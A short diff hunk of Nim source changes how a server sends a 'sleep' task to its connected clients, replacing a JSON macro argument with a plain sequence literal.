@@ -6,7 +6,7 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
     return
   
   for client in server.cli.handlingClient:
-    let task = await client.sendClientTask("sleep", %*[ args[0] ])
+    let task = await client.sendClientTask("sleep", @[ args[0] ])
     if not task.isNil(): 
       await task.awaitResponse()
       if task.isError():
